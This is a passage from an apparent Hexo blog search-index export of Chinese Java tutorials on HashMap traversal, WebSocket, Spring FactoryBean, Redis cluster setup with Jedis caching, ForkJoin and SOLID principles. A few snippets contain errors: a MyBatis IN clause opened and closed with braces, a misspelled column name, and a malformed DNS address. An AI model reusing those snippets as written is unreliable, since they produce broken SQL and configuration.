PageInfo pageInfo = new PageInfo(productList); pageInfo.setList(productListVoList); return ServerResponse.createBySuccess(pageInfo);&#125; 其中查询模糊查询和in查询的sql:12345678910111213&lt;select id="selectByNameAndCategoryIds" resultMap="BaseResultMap" parameterType="map"&gt; SELECT &lt;include refid="Base_Column_List"/&gt; from mmall_product WHERE status = 1 &lt;if test="productName != null"&gt; and name like #&#123;productName&#125; &lt;/if&gt; &lt;if test="categoryIdList != null"&gt; and cateforyId IN &lt;foreach collection="categoryIdList" item="item" index="index" open="&#123;" separator="," close="&#125;"&gt; #&#123;item&#125; &lt;/foreach&gt; &lt;/if&gt;&lt;/select&gt;]]></content>
      <tags>
        <tag>电商项目实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[8、HashMap和LinkedHashMap遍历机制]]></title>
    <url>%2F2018%2F07%2F21%2F8%E3%80%81HashMap%E5%92%8CLinkedHashMap%E9%81%8D%E5%8E%86%E6%9C%BA%E5%88%B6%2F</url>
    <content type="text"><![CDATA[本文分析HashMap和LinkedHashMap遍历机制. 一、对HashMap和LinkedHashMap遍历的几种方法这里以HashMap为例，LinkedHashMap一样的方式。12345678910111213141516171819202122232425262728293031323334353637public static void main(String[] args) &#123; Map&lt;String,String&gt; map=new HashMap&lt;String,String&gt;(); map.put("1", "value1"); map.put("2", "value2"); map.put("3", "value3"); map.put("4", "value4"); //第一种：普通使用，二次取值 System.out.println("\n通过Map.keySet遍历key和value："); for(String key:map.keySet()) &#123; System.out.println("Key: "+key+" Value: "+map.get(key)); &#125; //第二种 System.out.println("\n通过Map.entrySet使用iterator遍历key和value: "); Iterator&lt;Map.Entry&lt;String, String&gt;&gt; map1it=map.entrySet().iterator(); while(map1it.hasNext()) &#123; Map.Entry&lt;String, String&gt; entry= map1it.next(); System.out.println("Key: "+entry.getKey()+" Value: "+entry.getValue()); &#125; //第三种：推荐，尤其是容量大时 System.out.println("\n通过Map.entrySet遍历key和value"); for(Map.Entry&lt;String, String&gt; entry: map.entrySet()) &#123; System.out.println("Key: "+ entry.getKey()+ " Value: "+entry.getValue()); &#125; //第四种 System.out.println("\n通过Map.values()遍历所有的value，但不能遍历key"); for(String v:map.values()) &#123; System.out.println("The value is "+v); &#125; &#125; 我们知道，HashMap的输出顺序与元素的输入顺序无关，LinkedHashMap可以按照输入顺序输出，也可以根据读取元素的顺序输出。这一现象，已经在上一篇中展示出来了。 二、HashMap的遍历机制HashMap 提供了两个遍历访问其内部元素Entry&lt;k,v&gt;的接口： Set&lt;Map.Entry&lt;K,V&gt;&gt; entrySet()——-&gt;返回此映射所包含的映射关系的 Set 视图。 Set&lt;K&gt; keySet()——–&gt;返回此映射中所包含的键的 Set 视图。 实际上，第二个借口表示的Key的顺序，和第一个接口返回的Entry顺序是对应的，也就是说：这两种接口对HashMap的元素遍历的顺序相相同的。 那么，HashMap遍历内部Entry&lt;K,V&gt; 的顺序是什么呢？ 搞清楚这个问题，先要知道其内部结构是怎样的。 HashMap在存储Entry对象的时候，是根据Key的hash值判定存储到Entry[] table数组的哪一个索引值表示的链表上。 对HashMap遍历Entry对象的顺序和Entry对象的存储顺序之间没有任何关系。 HashMap散列图、Hashtable散列表是按“有利于随机查找的散列(hash)的顺序”。并非按输入顺序。遍历时只能全部输出，而没有顺序。甚至可以rehash()重新散列，来获得更利于随机存取的内部顺序。 三、LinkedHashMap 的遍历机制LinkedHashMap 是HashMap的子类，它可以实现对容器内Entry的存储顺序和对Entry的遍历顺序保持一致。 为了实现这个功能，LinkedHashMap内部使用了一个Entry类型的双向链表，用这个双向链表记录Entry的存储顺序。当需要对该Map进行遍历的时候，实际上是遍历的是这个双向链表。 LinkedHashMap内部使用的LinkedHashMap.Entry类继承自Map.Entry类，在其基础上增加了LinkedHashMap.Entry类型的两个字段，用来引用该Entry在双向链表中的前面的Entry对象和后面的Entry对象。 它的内部会在Map.Entry类的基础上，增加两个Entry类型的引用：before，after。LinkedHashMap使用一个双向连表，将其内部所有的Entry串起来。 1234LinkedHashMap linkedHashMap = new LinkedHashMap(); linkedHashMap.put("name","louis"); linkedHashMap.put("age","24"); linkedHashMap.put("sex","male"); 对LinkedHashMap进行遍历的策略： 从 header.after 指向的Entry对象开始，然后一直沿着此链表遍历下去，直到某个entry.after == header 为止，完成遍历。 根据Entry&lt;K,V&gt;插入LinkedHashMap的顺序进行遍历的方式叫做：按插入顺序遍历。 另外，LinkedHashMap还支持一种遍历顺序，叫做：Get读取顺序。 如果LinkedHashMap的这个Get读取遍历顺序开启，那么，当我们在LinkedHashMap上调用get(key) 方法时，会导致内部key对应的Entry在双向链表中的位置移动到双向链表的最后。 四、遍历机制的总结 HashMap对元素的遍历顺序跟Entry插入的顺序无关，而LinkedHashMap对元素的遍历顺序可以跟Entry&lt;K,V&gt;插入的顺序保持一致。 当LinkedHashMap处于Get获取顺序遍历模式下，当执行get() 操作时，会将对应的Entry&lt;k,v&gt;移到遍历的最后位置。 LinkedHashMap处于按插入顺序遍历的模式下，如果新插入的&lt;key,value&gt; 对应的key已经存在，对应的Entry在遍历顺序中的位置并不会改变。 除了遍历顺序外，其他特性HashMap和LinkedHashMap基本相同。]]></content>
      <tags>
        <tag>java容器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[8.整合WebSocket]]></title>
    <url>%2F2018%2F07%2F21%2F8.%E6%95%B4%E5%90%88WebSocket%2F</url>
    <content type="text"><![CDATA[慕课网微信点餐系统学习 前端1234567891011121314151617181920212223242526272829303132333435363738&lt;#--播放音乐--&gt;&lt;audio id="notice" loop="loop"&gt; &lt;source src="/sell/mp3/song.mp3" type="audio/mpeg" /&gt;&lt;/audio&gt;&lt;script src="https://cdn.bootcss.com/jquery/1.12.4/jquery.min.js"&gt;&lt;/script&gt;&lt;script src="https://cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"&gt;&lt;/script&gt;&lt;script&gt; var websocket = null; if('WebSocket' in window) &#123; websocket = new WebSocket('ws://www.oursnail.cn/sell/webSocket'); &#125;else &#123; alert('该浏览器不支持websocket!'); &#125; websocket.onopen = function (event) &#123; console.log('建立连接'); &#125; websocket.onclose = function (event) &#123; console.log('连接关闭'); &#125; websocket.onmessage = function (event) &#123; console.log('收到消息:' + event.data) //弹窗提醒, 播放音乐 $('#myModal').modal('show'); document.getElementById('notice').play(); &#125; websocket.onerror = function () &#123; alert('websocket通信发生错误！'); &#125; window.onbeforeunload = function () &#123; websocket.close(); &#125;&lt;/script&gt; 后端依赖1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-websocket&lt;/artifactId&gt;&lt;/dependency&gt; git pull强行覆盖本地内容： 123git fetch --all git reset --hard origin/master git pull 配置1234567@Componentpublic class WebSocketConfig &#123; @Bean public ServerEndpointExporter serverEndpointExporter() &#123; return new ServerEndpointExporter(); &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738@Component@ServerEndpoint("/webSocket")@Slf4jpublic class WebSocket &#123; private Session session; private static CopyOnWriteArraySet&lt;WebSocket&gt; webSocketSet = new CopyOnWriteArraySet&lt;&gt;(); @OnOpen public void onOpen(Session session) &#123; this.session = session; webSocketSet.add(this); log.info("【websocket消息】有新的连接, 总数:&#123;&#125;", webSocketSet.size()); &#125; @OnClose public void onClose() &#123; webSocketSet.remove(this); log.info("【websocket消息】连接断开, 总数:&#123;&#125;", webSocketSet.size()); &#125; @OnMessage public void onMessage(String message) &#123; log.info("【websocket消息】收到客户端发来的消息:&#123;&#125;", message); &#125; public void sendMessage(String message) &#123; for (WebSocket webSocket: webSocketSet) &#123; log.info("【websocket消息】广播消息, message=&#123;&#125;", message); try &#123; webSocket.session.getBasicRemote().sendText(message); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; &#125;&#125;]]></content>
      <tags>
        <tag>微信点餐系统</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[8.使用FactoryBean注册组件]]></title>
    <url>%2F2018%2F07%2F21%2F8.%E4%BD%BF%E7%94%A8FactoryBean%E6%B3%A8%E5%86%8C%E7%BB%84%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[学习spring注解版来实现组件的注册。 1234567891011121314151617181920212223242526public class AnimalFactory implements FactoryBean&#123; /** * @return 返回一个Pig对象，这个对象会添加到容器中 * @throws Exception */ @Override public Object getObject() throws Exception &#123; System.out.println("AnimalFactory...getObject()..."); return new Pig(); &#125; @Override public Class&lt;?&gt; getObjectType() &#123; return Pig.class; &#125; /** * 是单例吗？返回true表示是单例，在容器中保存一份 * false：表示是多例，每次获取都创建新的，每次调用getObject()这个方法 * @return */ @Override public boolean isSingleton() &#123; return true; &#125;&#125; 我们先将它用@Bean添加进容器看看： 1234@Beanpublic AnimalFactory animalFactory()&#123; return new AnimalFactory();&#125; 显示的id是animalFactory，我们根据这个id获取一下这个bean的类型： 12Object bean = applicationContext.getBean("animalFactory");System.out.println("bean的类型："+bean.getClass()); 结果显示： 12AnimalFactory...getObject()...bean的类型：class com.swg.bean.Pig 就是说，这个bean的类型就是getObject方法中返回的Pig对象。 那如果我们想获取这个工厂对象呢？也是可以的，id前面加上&amp;即可。 12Object bean = applicationContext.getBean("&amp;animalFactory");System.out.println("bean的类型："+bean.getClass());//bean的类型：class com.swg.bean.AnimalFactory 原因是在BeanFactory中定义了一个前缀&amp;，只要是以&amp;为前缀，表示拿FactoryBean身。 12public interface BeanFactory &#123; String FACTORY_BEAN_PREFIX = "&amp;";]]></content>
      <tags>
        <tag>spring学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[8.redis cluster实践--淘淘商城的某一节]]></title>
    <url>%2F2018%2F07%2F21%2F8.redis%20cluster%E5%AE%9E%E8%B7%B5--%E6%B7%98%E6%B7%98%E5%95%86%E5%9F%8E%E7%9A%84%E6%9F%90%E4%B8%80%E8%8A%82%2F</url>
    <content type="text"><![CDATA[介绍redis cluster实践。 1.redis安装首先是针对虚拟机可以ping通ip但是不能Ping通域名的情况解决。 首先关闭防火墙。然后cat /etc/resolv.conf这个文件。看是不是 12nameServer 8.8.8,8nameServer 8.8.4.4 如果不是改过来，但是不要进行网络重启:service network restart 这个时候应该是可以ping通域名了。 下面就是下载redis编译工具:yum install gcc和yum install g++ 解压redis.tar.gz文件，进去之后进行编译:make 然后安装：make install PREFIX=/usr/local/redis 安装成功之后进入/usr/local/redis/bin下启动redis:./redis-server 2. redis3.0集群搭建 解压redis,make进行编译。编译完成之后将会有一个redis.conf文件。 安装之后，在/usr/local下新建文件夹叫做redis-cluster文件夹，里面存放六个redis文件夹。分别叫做redis1-redis6 将make install之后产生的可执行文件全部拷贝到redis1目录下，将redis.conf也拷贝到下面。 修改redis.conf文件的端口号，从7001-7006,然后将cluster-enabled yes打开，最后将daemonize yes。 全部编辑好之后，在redis-cluster目录下新建一个脚本叫做start-al.l.sh: 123456789101112131415161718cd redis1./redis-server redis.confcd ..cd redis2./redis-server redis.confcd ..cd redis3./redis-server redis.confcd ..cd redis4./redis-server redis.confcd ..cd redis5./redis-server redis.confcd ..cd redis6./redis-server redis.confcd .. 给这个脚本增加一个可执行的权限:chmod +x start-all.sh。然后执行这个文件即可。用ps aux | grep redis：如果可以看到6个redis都起来了，说明是有用了。 搭建服务端集群，需要用ruby环境，所以现在安装ruby. redis 3.x 之后自带了 redis-trip.rb 命令，此命令用于创建redis 集群，在最初创建的时候调用一次即可，创建完之后，重新启动时，则不需要再调用了。 使用此命令，redis 会帮你分配主从节点，创建相关的node.conf 配置文件（此配置文件记录的是集群节点的信息：主从关系等）。但是redis-trib.rb 是用ruby 写的脚本，要想使用此脚本，必须先安装ruby 环境。 yum install ruby yum install rubygems：ruby软件包源 将redis-3.0.0.gem复制到linux中，对其进行安装：gem install redis-3.0.0.gem 安装完毕之后，将之前make之后的redis目录下的src目录下的redis-trib.rb拷贝到redis-cluster目录下。 设置集群：./redis-trib.rb create --replicas 1 10.128.24.175:7001 10.128.24.175:7002 10.128.24.175:7003 10.128.24.175:7004 10.128.24.175:7005 10.128.24.175:7006 输出以下内容表明集群搭建成功，期间会问你是否接受这种分配方案，就是7001,7002,7003作为主，7004,7005,7006分别作为从服务器。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&gt;&gt;&gt; Creating clusterConnecting to node 10.128.24.175:7001: OKConnecting to node 10.128.24.175:7002: OKConnecting to node 10.128.24.175:7003: OKConnecting to node 10.128.24.175:7004: OKConnecting to node 10.128.24.175:7005: OKConnecting to node 10.128.24.175:7006: OK&gt;&gt;&gt; Performing hash slots allocation on 6 nodes...Using 3 masters:10.128.24.175:700110.128.24.175:700210.128.24.175:7003Adding replica 10.128.24.175:7004 to 10.128.24.175:7001Adding replica 10.128.24.175:7005 to 10.128.24.175:7002Adding replica 10.128.24.175:7006 to 10.128.24.175:7003M: db80f5d7987334be095caafec5a377e5dcf85f4d 10.128.24.175:7001 slots:0-5460 (5461 slots) masterM: a25e822374fc35033936a0d55bc133bd80fb5222 10.128.24.175:7002 slots:5461-10922 (5462 slots) masterM: af00fe26cf47c2923dcf33a6cb7d714dd2fcd260 10.128.24.175:7003 slots:10923-16383 (5461 slots) masterS: fb2ec80d34811c8014b4c87918c7ce330779382b 10.128.24.175:7004 replicates db80f5d7987334be095caafec5a377e5dcf85f4dS: 486137e1f057b85c3f9827929a44aff0286b841c 10.128.24.175:7005 replicates a25e822374fc35033936a0d55bc133bd80fb5222S: 871555b15c71acf3fe4b44ad53232c29814ec13c 10.128.24.175:7006 replicates af00fe26cf47c2923dcf33a6cb7d714dd2fcd260Can I set the above configuration? (type &apos;yes&apos; to accept): yes&gt;&gt;&gt; Nodes configuration updated&gt;&gt;&gt; Assign a different config epoch to each node&gt;&gt;&gt; Sending CLUSTER MEET messages to join the clusterWaiting for the cluster to join......&gt;&gt;&gt; Performing Cluster Check (using node 10.128.24.175:7001)M: db80f5d7987334be095caafec5a377e5dcf85f4d 10.128.24.175:7001 slots:0-5460 (5461 slots) masterM: a25e822374fc35033936a0d55bc133bd80fb5222 10.128.24.175:7002 slots:5461-10922 (5462 slots) masterM: af00fe26cf47c2923dcf33a6cb7d714dd2fcd260 10.128.24.175:7003 slots:10923-16383 (5461 slots) masterM: fb2ec80d34811c8014b4c87918c7ce330779382b 10.128.24.175:7004 slots: (0 slots) master replicates db80f5d7987334be095caafec5a377e5dcf85f4dM: 486137e1f057b85c3f9827929a44aff0286b841c 10.128.24.175:7005 slots: (0 slots) master replicates a25e822374fc35033936a0d55bc133bd80fb5222M: 871555b15c71acf3fe4b44ad53232c29814ec13c 10.128.24.175:7006 slots: (0 slots) master replicates af00fe26cf47c2923dcf33a6cb7d714dd2fcd260[OK] All nodes agree about slots configuration.&gt;&gt;&gt; Check for open slots...&gt;&gt;&gt; Check slots coverage...[OK] All 16384 slots covered. 访问测试。 到/usr/local/redis-cluster/redis1/ 执行 ./redis-cli -p 7001 -c ，可以尝试塞几次值。发现会比较分散地塞到不同的mater中的槽中。 redis cluser两个小命令。 查看槽信息：我们可以看到一共有16384个槽，分布在这三个mater节点上。12345678910111210.128.24.175:7003&gt; cluster infocluster_state:okcluster_slots_assigned:16384cluster_slots_ok:16384cluster_slots_pfail:0cluster_slots_fail:0cluster_known_nodes:6cluster_size:3cluster_current_epoch:6cluster_my_epoch:3cluster_stats_messages_sent:706cluster_stats_messages_received:706 cluster nodes，我们可以看到，10.128.24.175:7001中的槽分布是0-5460，10.128.24.175:7002是5461-10922，10.128.24.175:7003是10923-16383123456710.128.24.175:7003&gt; cluster nodesaf00fe26cf47c2923dcf33a6cb7d714dd2fcd260 10.128.24.175:7003 myself,master - 0 0 3 connected 10923-16383db80f5d7987334be095caafec5a377e5dcf85f4d 10.128.24.175:7001 master - 0 1525511739724 1 connected 0-5460486137e1f057b85c3f9827929a44aff0286b841c 10.128.24.175:7005 slave a25e822374fc35033936a0d55bc133bd80fb5222 0 1525511738718 5 connected871555b15c71acf3fe4b44ad53232c29814ec13c 10.128.24.175:7006 slave af00fe26cf47c2923dcf33a6cb7d714dd2fcd260 0 1525511734692 6 connecteda25e822374fc35033936a0d55bc133bd80fb5222 10.128.24.175:7002 master - 0 1525511736703 2 connected 5461-10922fb2ec80d34811c8014b4c87918c7ce330779382b 10.128.24.175:7004 slave db80f5d7987334be095caafec5a377e5dcf85f4d 0 1525511737710 4 connected 3. 相关理论redis集群后，我们就需要一种数据路由算法将不同key分散存储到不同的redis节点内，通常的做法是获取某个key的hashcode，然后mod，不过这种做法无法很好的支持动态伸缩性需求，一旦节点的增或者删操作，都会导致key无法在redis中命中，所以在redis3.x之前，基本上都是采用编写一致性hash算法实现redis的集群，但是redis3.x正式支持cluster后，却采用的是hash slot(hash槽)。 Redis 集群没有使用一致性hash, 而是引入了 哈希槽的概念. redis集群中一共内置了16384个哈希槽，当set操作时，redis先对key使用crc16验证出一个结果，然后把结果对mod 16384，这样每个 key 都会对应一个编号在 0-16383 之间的哈希槽，redis 会根据节点数量大致均等的将哈希槽映射到不同的节点。这样做的好处很明显，当需要增加节点时，只需要把其他节点的某些哈希槽挪到新节点就可以了；当需要移除节点时，只需要把移除节点上的哈希槽挪到其他节点就行了。 由于从一个节点将哈希槽移动到另一个节点并不会停止服务,所以无论添加删除或者改变某个节点的哈希槽的数量都不会造成集群不可用的状态. 4. 与项目整合我们可以用策略模式来实现单机版和集群版的测试和更换。 先定义一个接口： 123456789101112public interface JedisClient &#123; String set(String key, String value); String get(String key); Boolean exists(String key); Long expire(String key, int seconds); Long ttl(String key); Long incr(String key); Long hset(String key, String field, String value); String hget(String key, String field); Long hdel(String key, String... field);&#125; 单机的Jedis来连接redis 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081import org.springframework.beans.factory.annotation.Autowired;import redis.clients.jedis.Jedis;import redis.clients.jedis.JedisPool;public class JedisClientPool implements JedisClient &#123; @Autowired private JedisPool jedisPool; @Override public String set(String key, String value) &#123; Jedis jedis = jedisPool.getResource(); String result = jedis.set(key, value); jedis.close(); return result; &#125; @Override public String get(String key) &#123; Jedis jedis = jedisPool.getResource(); String result = jedis.get(key); jedis.close(); return result; &#125; @Override public Boolean exists(String key) &#123; Jedis jedis = jedisPool.getResource(); Boolean result = jedis.exists(key); jedis.close(); return result; &#125; @Override public Long expire(String key, int seconds) &#123; Jedis jedis = jedisPool.getResource(); Long result = jedis.expire(key, seconds); jedis.close(); return result; &#125; @Override public Long ttl(String key) &#123; Jedis jedis = jedisPool.getResource(); Long result = jedis.ttl(key); jedis.close(); return result; &#125; @Override public Long incr(String key) &#123; Jedis jedis = jedisPool.getResource(); Long result = jedis.incr(key); jedis.close(); return result; &#125; @Override public Long hset(String key, String field, String value) &#123; Jedis jedis = jedisPool.getResource(); Long result = jedis.hset(key, field, value); jedis.close(); return result; &#125; @Override public String hget(String key, String field) &#123; Jedis jedis = jedisPool.getResource(); String result = jedis.hget(key, field); jedis.close(); return result; &#125; @Override public Long hdel(String key, String... field) &#123; Jedis jedis = jedisPool.getResource(); Long result = jedis.hdel(key, field); jedis.close(); return result; &#125;&#125; 集群版本的连接： JedisCluster使用技巧： 单例，内置了所有节点的连接池 无需手动借还连接池 合理设置commons-pool 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354import org.springframework.beans.factory.annotation.Autowired;import redis.clients.jedis.JedisCluster;public class JedisClientCluster implements JedisClient &#123; @Autowired private JedisCluster jedisCluster; @Override public String set(String key, String value) &#123; return jedisCluster.set(key, value); &#125; @Override public String get(String key) &#123; return jedisCluster.get(key); &#125; @Override public Boolean exists(String key) &#123; return jedisCluster.exists(key); &#125; @Override public Long expire(String key, int seconds) &#123; return jedisCluster.expire(key, seconds); &#125; @Override public Long ttl(String key) &#123; return jedisCluster.ttl(key); &#125; @Override public Long incr(String key) &#123; return jedisCluster.incr(key); &#125; @Override public Long hset(String key, String field, String value) &#123; return jedisCluster.hset(key, field, value); &#125; @Override public String hget(String key, String field) &#123; return jedisCluster.hget(key, field); &#125; @Override public Long hdel(String key, String... field) &#123; return jedisCluster.hdel(key, field); &#125;&#125; 具体使用哪一个呢？很显然我们先配置好用哪个，然后在程序中注入进来即可。 先在application-redis中配置使用哪一个： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:context="http://www.springframework.org/schema/context" xmlns:p="http://www.springframework.org/schema/p" xmlns:aop="http://www.springframework.org/schema/aop" xmlns:tx="http://www.springframework.org/schema/tx" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-4.2.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.2.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-4.2.xsd http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx-4.2.xsd http://www.springframework.org/schema/util http://www.springframework.org/schema/util/spring-util-4.2.xsd"&gt; &lt;context:annotation-config/&gt; &lt;!-- redis单机版 --&gt;&lt;!-- &lt;bean id="jedisPool" class="redis.clients.jedis.JedisPool"&gt; &lt;constructor-arg name="host" value="192.168.25.153"/&gt; &lt;constructor-arg name="port" value="6379"/&gt; &lt;/bean&gt; &lt;bean id="jedisClientPool" class="com.njupt.swg.jedis.JedisClientPool"/&gt;--&gt; &lt;!-- redis集群 --&gt; &lt;bean id="jedisCluster" class="redis.clients.jedis.JedisCluster"&gt; &lt;constructor-arg&gt; &lt;set&gt; &lt;bean class="redis.clients.jedis.HostAndPort"&gt; &lt;constructor-arg name="host" value="10.128.24.175"/&gt; &lt;constructor-arg name="port" value="7001"/&gt; &lt;/bean&gt; &lt;bean class="redis.clients.jedis.HostAndPort"&gt; &lt;constructor-arg name="host" value="10.128.24.175"/&gt; &lt;constructor-arg name="port" value="7002"/&gt; &lt;/bean&gt; &lt;bean class="redis.clients.jedis.HostAndPort"&gt; &lt;constructor-arg name="host" value="10.128.24.175"/&gt; &lt;constructor-arg name="port" value="7003"/&gt; &lt;/bean&gt; &lt;bean class="redis.clients.jedis.HostAndPort"&gt; &lt;constructor-arg name="host" value="10.128.24.175"/&gt; &lt;constructor-arg name="port" value="7004"/&gt; &lt;/bean&gt; &lt;bean class="redis.clients.jedis.HostAndPort"&gt; &lt;constructor-arg name="host" value="10.128.24.175"/&gt; &lt;constructor-arg name="port" value="7005"/&gt; &lt;/bean&gt; &lt;bean class="redis.clients.jedis.HostAndPort"&gt; &lt;constructor-arg name="host" value="10.128.24.175"/&gt; &lt;constructor-arg name="port" value="7006"/&gt; &lt;/bean&gt; &lt;/set&gt; &lt;/constructor-arg&gt; &lt;/bean&gt; &lt;bean id="jedisClientCluster" class="com.njupt.swg.jedis.JedisClientCluster"/&gt; &lt;/beans&gt; 这样，我们要用到redis了，直接注入： 12@Autowiredprivate JedisClient jedisClient; 以ContentServiceImpl中的getContentByCid为例，根据cid查询轮播图内容列表，原来的逻辑是直接从数据库取，这里改为从缓存读。 先尝试到缓存中读—没有再从数据库取—将结果添加到缓存中 1234567891011121314151617181920212223242526272829303132333435@Overridepublic List&lt;TbContent&gt; getContentByCid(long cid) &#123; //先查询缓存 //添加缓存不能影响正常业务逻辑 try &#123; //查询缓存 String json = jedisClient.hget("INDEX_CONTENT", cid + ""); //查询到结果，把json转换成List返回 if (StringUtils.isNotBlank(json)) &#123; List&lt;TbContent&gt; list = JsonUtils.jsonToList(json, TbContent.class); return list; &#125; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; //缓存中没有命中，需要查询数据库 TbContentExample example = new TbContentExample(); TbContentExample.Criteria criteria = example.createCriteria(); //设置查询条件 criteria.andCategoryIdEqualTo(cid); //执行查询 List&lt;TbContent&gt; list = contentMapper.selectByExample(example); //把结果添加到缓存 try &#123; jedisClient.hset("INDEX_CONTENT", cid + "", JsonUtils.objectToJson(list)); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; //返回结果 return list;&#125;]]></content>
      <categories>
        <category>redis</category>
      </categories>
      <tags>
        <tag>redis学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[8.JUC组件拓展-ForkJoin简介]]></title>
    <url>%2F2018%2F07%2F21%2F8.JUC%E7%BB%84%E4%BB%B6%E6%8B%93%E5%B1%95-ForkJoin%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[JUC组件拓展-ForkJoin简介 ForkJoin什么是Fork/Join框架Fork/Join框架是Java7提供了的一个用于并行执行任务的框架， 是一个把大任务分割成若干个小任务，最终汇总每个小任务结果后得到大任务结果的框架。 我们再通过Fork和Join这两个单词来理解下Fork/Join框架，Fork就是把一个大任务切分为若干子任务并行的执行，Join就是合并这些子任务的执行结果，最后得到这个大任务的结果。比如计算1+2+。。＋10000，可以分割成10个子任务，每个子任务分别对1000个数进行求和，最终汇总这10个子任务的结果。 工作窃取算法工作窃取（work-stealing）算法是指某个线程从其他队列里窃取任务来执行。工作窃取的运行流程图如下： 那么为什么需要使用工作窃取算法呢？ 假如我们需要做一个比较大的任务，我们可以把这个任务分割为若干互不依赖的子任务，为了减少线程间的竞争，于是把这些子任务分别放到不同的队列里，并为每个队列创建一个单独的线程来执行队列里的任务，线程和队列一一对应，比如A线程负责处理A队列里的任务。但是有的线程会先把自己队列里的任务干完，而其他线程对应的队列里还有任务等待处理。干完活的线程与其等着，不如去帮其他线程干活，于是它就去其他线程的队列里窃取一个任务来执行。 Fork/Join框架如何实现工作窃取的？ 这时它们会访问同一个队列，所以为了减少窃取任务线程和被窃取任务线程之间的竞争，通常会使用双端队列，被窃取任务线程永远从双端队列的头部拿任务执行，而窃取任务的线程永远从双端队列的尾部拿任务执行。 Fork/Join框架有没有什么缺点？ 工作窃取算法的优点是充分利用线程进行并行计算，并减少了线程间的竞争，其缺点是在某些情况下还是存在竞争，比如双端队列里只有一个任务时。并且消耗了更多的系统资源，比如创建多个线程和多个双端队列。 该如何设计一个Fork/Join框架? 第一步分割任务。首先我们需要有一个fork类来把大任务分割成子任务，有可能子任务还是很大，所以还需要不停的分割，直到分割出的子任务足够小。 第二步执行任务并合并结果。分割的子任务分别放在双端队列里，然后几个启动线程分别从双端队列里获取任务执行。子任务执行完的结果都统一放在一个队列里，启动一个线程从队列里拿数据，然后合并这些数据。 Fork/Join框架给我们的重要的类 ForkJoinTask：我们要使用ForkJoin框架，必须首先创建一个ForkJoin任务。它提供在任务中执行fork()和join()操作的机制，通常情况下我们不需要直接继承ForkJoinTask类，而只需要继承它的子类，Fork/Join框架提供了以下两个子类： RecursiveAction：用于没有返回结果的任务。 比如大任务是：打印0-200的数值。小任务是：每次只能打印50个数值。 RecursiveTask ：用于有返回结果的任务。 大任务是：计算随机的100个数字的和。 小任务是：每次只能20个数值的和。 ForkJoinPool ：ForkJoinTask需要通过ForkJoinPool来执行，任务分割出的子任务会添加到当前工作线程所维护的双端队列中，进入队列的头部。当一个工作线程的队列里暂时没有任务时，它会随机从其他工作线程的队列的尾部获取一个任务。 具体的demo代码可以参照：https://blog.csdn.net/ouyang_peng/article/details/46491217。这里我只想知道这个框架的作用，暂时还不想深入原理进行剖析。以后要用了再来好好写一篇文章来说说。]]></content>
      <tags>
        <tag>java并发进阶</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[8.java面向对象]]></title>
    <url>%2F2018%2F07%2F21%2F8.java%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%2F</url>
    <content type="text"><![CDATA[本篇文章探讨java面向对象方面的知识。 一、设计原则S.O.L.I.D 简写 全拼 中文翻译 SRP The Single Responsibility Principle 单一责任原则 OCP The Open Closed Principle 开放封闭原则 LSP The Liskov Substitution Principle 里氏替换原则 ISP The Interface Segregation Principle 接口分离原则 DIP The Dependency Inversion Principle 依赖倒置原则 1. 单一责任原则 修改一个类的原因应该只有一个。 换句话说就是让一个类只负责一件事，当这个类需要做过多事情的时候，就需要分解这个类。 如果一个类承担的职责过多，就等于把这些职责耦合在了一起，一个职责的变化可能会削弱这个类完成其它职责的能力。 2. 开放封闭原则 类应该对扩展开放，对修改关闭。 扩展就是添加新功能的意思，因此该原则要求在添加新功能时不需要修改代码。 符合开闭原则最典型的设计模式是装饰者模式，它可以动态地将责任附加到对象上，而不用去修改类的代码。 3. 里氏替换原则 子类对象必须能够替换掉所有父类对象。 继承是一种 IS-A 关系，子类需要能够当成父类来使用，并且需要比父类更特殊。 如果不满足这个原则，那么各个子类的行为上就会有很大差异，增加继承体系的复杂度。 4. 接口分离原则 不应该强迫客户依赖于它们不用的方法。 因此使用多个专门的接口比使用单一的总接口要好。 5. 依赖倒置原则 高层模块不应该依赖于低层模块，二者都应该依赖于抽象；抽象不应该依赖于细节，细节应该依赖于抽象。 高层模块包含一个应用程序中重要的策略选择和业务模块，如果高层模块依赖于低层模块，那么低层模块的改动就会直接影响到高层模块，从而迫使高层模块也需要改动。 依赖于抽象意味着： 任何变量都不应该持有一个指向具体类的指针或者引用； 任何类都不应该从具体类派生； 任何方法都不应该覆写它的任何基类中的已经实现的方法。 二、三大特性封装利用抽象数据类型将数据和基于数据的操作封装在一起，使其构成一个不可分割的独立实体。数据被保护在抽象数据类型的内部，尽可能地隐藏内部的细节，只保留一些对外接口使之与外部发生联系。用户无需知道对象内部的细节，但可以通过对象对外提供的接口来访问该对象。 优点： 减少耦合：可以独立地开发、测试、优化、使用、理解和修改 减轻维护的负担：可以更容易被程序员理解，并且在调试的时候可以不影响其他模块 有效地调节性能：可以通过剖析确定哪些模块影响了系统的性能 提高软件的可重用性 